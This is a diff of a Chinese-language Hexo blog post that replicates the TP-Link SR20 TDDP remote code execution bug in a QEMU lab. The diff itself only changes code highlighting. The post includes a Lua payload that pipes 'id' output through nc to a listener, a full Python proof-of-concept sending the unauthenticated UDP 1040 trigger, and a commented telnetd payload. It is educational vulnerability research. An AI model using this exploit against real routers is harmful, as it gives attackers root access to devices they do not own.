@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="0x00 缘起IoT设备，固件小，功能单一，相对操作系统上一些成熟应用程序来说漏洞比较少但是却更容易利用；嵌入式linux环境下的漏洞挖掘类似于对linux的程序做模糊测试，甚至有点类似于CTF中的linux pwn，所以对新人还是相对来说比较友好的。为了拓展自己的学习领域，最终还是踏足了IoT这一块。这边记录下复现这个路由器的代码执行漏洞的过程，熟悉下相关工具&amp;环境的使用和配置。">
@@ -105,7 +105,7 @@
   </style>
 </noscript>
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -330,9 +330,8 @@
         <h2 id="0x00-缘起"><a href="#0x00-缘起" class="headerlink" title="0x00 缘起"></a>0x00 缘起</h2><p>IoT设备，固件小，功能单一，相对操作系统上一些成熟应用程序来说漏洞比较少但是却更容易利用；嵌入式linux环境下的漏洞挖掘类似于对linux的程序做模糊测试，甚至有点类似于CTF中的linux pwn，所以对新人还是相对来说比较友好的。为了拓展自己的学习领域，最终还是踏足了IoT这一块。这边记录下复现这个路由器的代码执行漏洞的过程，熟悉下相关工具&amp;环境的使用和配置。</p>
 <a id="more"></a>
 
-<h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">此远程代码执行漏洞允许用户在设备上以 root 权限执行任意命令，该漏洞存在于 TP-<span class="meta">Link</span> 设备调试协议(TP-<span class="meta">Link</span> Device Debug Protocol 英文简称 TDDP) 中，TDDP 是 TP-<span class="meta">Link</span> 申请了专利的调试协议，基于 UDP 运行在 1040 端口</span><br><span class="line">TP-<span class="meta">Link</span> SR20 设备运行了 V1 版本的 TDDP 协议，V1 版本无需认证，只需往 SR20 设备的 UDP 1040 端口发送数据，且数据的第二字节为 0x31 时，SR20 设备会连接发送该请求设备的 TFTP 服务下载相应的文件并使用 LUA 解释器以 root 权限来执行，这就导致存在远程代码执行漏洞</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x02-工具准备"><a href="#0x02-工具准备" class="headerlink" title="0x02 工具准备"></a>0x02 工具准备</h2><ul>
+<h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><pre><code>此远程代码执行漏洞允许用户在设备上以 root 权限执行任意命令，该漏洞存在于 TP-Link 设备调试协议(TP-Link Device Debug Protocol 英文简称 TDDP) 中，TDDP 是 TP-Link 申请了专利的调试协议，基于 UDP 运行在 1040 端口
+TP-Link SR20 设备运行了 V1 版本的 TDDP 协议，V1 版本无需认证，只需往 SR20 设备的 UDP 1040 端口发送数据，且数据的第二字节为 0x31 时，SR20 设备会连接发送该请求设备的 TFTP 服务下载相应的文件并使用 LUA 解释器以 root 权限来执行，这就导致存在远程代码执行漏洞</code></pre><h2 id="0x02-工具准备"><a href="#0x02-工具准备" class="headerlink" title="0x02 工具准备"></a>0x02 工具准备</h2><ul>
 <li>源码编译qemu，直接apt的话可能安装的不是最新版本</li>
 <li>源码编译binwalk，直接apt的话可能 会有依赖问题</li>
 </ul>
@@ -353,11 +352,9 @@
 <li>vmlinuz-3.2.0-4-vexpress</li>
 </ul>
 <p>之后把三个文件放在一个目录下执行</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tunctl -t tap0 -u `whoami`  # 为了与 QEMU 虚拟机通信，添加一个虚拟网卡</span><br><span class="line">$ sudo ifconfig tap0 10.10.10.1/24 # 为添加的虚拟网卡配置<span class="built_in"> IP </span>地址</span><br><span class="line">$ qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive <span class="attribute">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 -append <span class="string">"root=/dev/mmcblk0p2 console=ttyAMA0"</span> -net nic -net tap,<span class="attribute">ifname</span>=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="./%E8%99%9A%E6%8B%9F%E6%9C%BA1.png" alt=""></p>
+<pre><code>$ sudo tunctl -t tap0 -u `whoami`  # 为了与 QEMU 虚拟机通信，添加一个虚拟网卡
+$ sudo ifconfig tap0 10.10.10.1/24 # 为添加的虚拟网卡配置 IP 地址
+$ qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</code></pre><p><img src="./%E8%99%9A%E6%8B%9F%E6%9C%BA1.png" alt=""></p>
 <p><img src="./%E8%99%9A%E6%8B%9F%E6%9C%BA2.png" alt=""></p>
 <p>配置网卡ip</p>
 <p><code>ifconfig eth0 10.10.10.2/24</code></p>
@@ -369,26 +366,63 @@
 <p>qemu虚拟机上执行<code>wget http://10.10.10.1:8000/squashfs-root.tar.bz2</code>获取宿主机文件。</p>
 <p><img src="./%E6%96%87%E4%BB%B61.png" alt=""></p>
 <p>传好以后需要将当前目录设定为根目录，否则的话有些库会从debian系统的lib目录下去寻找。</p>
-<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev/</span><br><span class="line">mount -t <span class="keyword">proc</span> /<span class="keyword">proc</span>/ ./squashfs-root/<span class="keyword">proc</span>/</span><br><span class="line">chroot<span class="title"> squashfs-root</span> sh # 切换根目录后执行新目录结构下的<span class="title"> sh</span> shell</span><br></pre></td></tr></table></figure>
-
-<p><img src="./%E9%85%8D%E7%BD%AE1.png" alt=""></p>
+<pre><code>mount -o bind /dev ./squashfs-root/dev/
+mount -t proc /proc/ ./squashfs-root/proc/
+chroot squashfs-root sh # 切换根目录后执行新目录结构下的 sh shell</code></pre><p><img src="./%E9%85%8D%E7%BD%AE1.png" alt=""></p>
 <p>之后在宿主机搭建tftp服务</p>
 <p><code>sudo apt install atftpd</code></p>
 <p><img src="./%E6%9C%8D%E5%8A%A11.png" alt=""></p>
 <p>到这边漏洞环境搭建完毕。</p>
 <h2 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h2><p>在atftp的根目录/tftpboot写下payload，内容为</p>
-<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">config_test</span><span class="params">(config)</span></span></span><br><span class="line">  <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">"id | nc 10.10.10.1 1337"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
-
-<ul>
+<pre><code>function config_test(config)
+  os.execute(&quot;id | nc 10.10.10.1 1337&quot;)
+end</code></pre><ul>
 <li>QEMU 虚拟机中启动 tddp 程序</li>
 <li>宿主机使用 NC 监听端口</li>
 <li>执行 POC，获取命令执行结果</li>
 </ul>
-<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copyright 2019 Google LLC.</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: Apache-2.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a file in your tftp directory with the following contents:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#function config_test(config)</span></span><br><span class="line"><span class="comment">#  os.execute("telnetd -l /bin/login.sh")</span></span><br><span class="line"><span class="comment">#end</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Execute script as poc.py remoteaddr filename</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import binascii</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">port_send = 1040</span><br><span class="line">port_receive = 61000</span><br><span class="line"></span><br><span class="line">tddp_ver = <span class="string">"01"</span></span><br><span class="line">tddp_command = <span class="string">"31"</span></span><br><span class="line">tddp_req = <span class="string">"01"</span></span><br><span class="line">tddp_reply = <span class="string">"00"</span></span><br><span class="line">tddp_padding = <span class="string">"%0.16X"</span> % 00</span><br><span class="line"></span><br><span class="line">tddp_packet = <span class="string">""</span>.join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])</span><br><span class="line"></span><br><span class="line">sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">sock_receive.bind(('', port_receive))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send a request</span></span><br><span class="line">sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">packet = binascii.unhexlify(tddp_packet)</span><br><span class="line">argument = <span class="string">"%s;arbitrary"</span> % sys.argv[2]</span><br><span class="line">packet = packet + argument.encode()</span><br><span class="line">sock_send.sendto(packet, (sys.argv[1], port_send))</span><br><span class="line">sock_send.close()</span><br><span class="line"></span><br><span class="line">response, addr = sock_receive.recvfrom(1024)</span><br><span class="line">r = response.encode('hex')</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure>
+<pre><code>#!/usr/bin/python3
 
+# Copyright 2019 Google LLC.
+# SPDX-License-Identifier: Apache-2.0
 
+# Create a file in your tftp directory with the following contents:
+#
+#function config_test(config)
+#  os.execute(&quot;telnetd -l /bin/login.sh&quot;)
+#end
+#
+# Execute script as poc.py remoteaddr filename
 
-<p><code>nc -lvnp 1337</code></p>
+import sys
+import binascii
+import socket
+
+port_send = 1040
+port_receive = 61000
+
+tddp_ver = &quot;01&quot;
+tddp_command = &quot;31&quot;
+tddp_req = &quot;01&quot;
+tddp_reply = &quot;00&quot;
+tddp_padding = &quot;%0.16X&quot; % 00
+
+tddp_packet = &quot;&quot;.join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])
+
+sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock_receive.bind((&#39;&#39;, port_receive))
+
+# Send a request
+sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+packet = binascii.unhexlify(tddp_packet)
+argument = &quot;%s;arbitrary&quot; % sys.argv[2]
+packet = packet + argument.encode()
+sock_send.sendto(packet, (sys.argv[1], port_send))
+sock_send.close()
+
+response, addr = sock_receive.recvfrom(1024)
+r = response.encode(&#39;hex&#39;)
+print(r)</code></pre><p><code>nc -lvnp 1337</code></p>
 <p><code>python3 poc.py 10.10.10.2 /payload</code></p>
 <p><img src="./%E6%88%90%E5%8A%9F.png" alt=""></p>
 
@@ -496,6 +530,8 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
